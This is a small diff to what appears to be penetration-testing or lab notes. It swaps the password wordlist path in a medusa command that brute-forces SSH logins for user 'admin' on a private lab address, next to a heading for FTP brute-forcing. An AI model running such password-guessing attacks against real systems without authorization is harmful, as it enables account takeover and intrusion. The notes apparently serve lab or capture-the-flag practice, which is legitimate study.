@@ -17,7 +17,7 @@
 ### Bruteforce SSH
 
 ```bash
-medusa -h 10.10.11.42 -u admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt -M ssh -t 4
+medusa -h 10.10.11.42 -u admin -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt -M ssh -t 4
 ```
 
 ### Bruteforce FTP
